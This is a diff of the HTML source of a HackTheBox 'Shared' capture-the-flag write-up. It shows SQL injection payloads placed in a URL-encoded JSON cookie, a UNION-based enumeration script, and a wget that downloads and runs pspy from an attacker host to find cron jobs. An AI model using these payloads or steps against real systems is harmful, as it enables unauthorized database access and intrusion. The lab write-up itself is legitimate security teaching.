@@ -44,7 +44,7 @@ Type ".help" for more information.
 &gt; decodeURIComponent('%7B%22YCS98E4A%22%3A%221%22%7D')  
 <span class="code-dark-green">'{"YCS98E4A":"1"}'</span>
 </code></pre></div><h3 id="finding-sqli">Finding SQLi</h3><p>Ok, it is just a JSON document. What if we modify our cookie and use a SQL injection payload? Let&rsquo;s try:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; encodeURIComponent(`{"' or 1=1-- -":"1"}`)  
-<span class="code-dark-green">"%7B%22'%20or%201%3D1--%20-%22%3A%221%22%7D"
+<span class="code-dark-green">"%7B%22'%20or%201%3D1--%20-%22%3A%221%22%7D"</span>
 </code></pre></div><p>Now we can set this cookie in the browser and see what we have:</p><p><img alt="Shared item sqli" src="/images/HTB/Shared/Shared-checkout-sqli.webp"></p><p>If we look carefully, we will notice that the item in the cart is different from before, so the injection has been successful. Now let&rsquo;s use <code>UNION</code> queries to see the number of columns of the current table and to check the one that is reflected in the page.</p><p>Finally, we will get that it has 3 columns and the second one is reflected:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; encodeURIComponent(`{"' union select 1,2,3-- -":"1"}`)
 <span class="code-dark-green">"%7B%22'%20union%20select%201%2C2%2C3--%20-%22%3A%221%22%7D"</span>  
 </code></pre></div><p><img alt="Shared item sqli union" src="/images/HTB/Shared/Shared-checkout-sqli-union.webp"></p><h2 id="foothold">Foothold</h2><p>To enumerate the database, I decided to write a short script using Node.js called <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Shared/sqli.js"><code>sqli.js</code></a> (detailed explanation <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Shared#sqlijs">here</a>). We will get the output of the reflected column:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">sqli.js</span> <span class="code-dark-yellow">"' union select 1,'asdf',3-- -"</span>  
@@ -110,12 +110,12 @@ uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(develo
 <span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ ls -la /opt/scripts_review/
 total 8
 drwxrwx--- 2 root developer 4096 Jul 14 13:46 <span class="code-blue">.</span>
-drwxr-xr-x 3 root root      4096 Jul 14 13:46 <span class="code-blue">..
+drwxr-xr-x 3 root root      4096 Jul 14 13:46 <span class="code-blue">..</span>
 </code></pre></div><h2 id="lateral-movement-to-user-dan_smith">Lateral movement to user <code>dan_smith</code></h2><p>If we upload <a target="_blank" href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> to the machine and run it, we will see some suspicious commands:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ wget -qO .pspy 10.10.17.44/pspy64s
 <span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ chmod +x .pspy
 <span class="code-green">james_mason@shared</span>:<span class="code-blue">/tmp</span>$ ./.pspy
 ...
-</span><span class="code-blue">CMD: UID=0    PID=2624   | /usr/sbin/CRON -f</span>
+<span class="code-blue">CMD: UID=0    PID=2624   | /usr/sbin/CRON -f</span>
 <span class="code-blue">CMD: UID=1001 PID=2629   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython</span>  
 <span class="code-blue">CMD: UID=0    PID=2628   | /bin/bash /root/c.sh</span>
 <span class="code-blue">CMD: UID=0    PID=2627   | /bin/bash /root/c.sh</span>
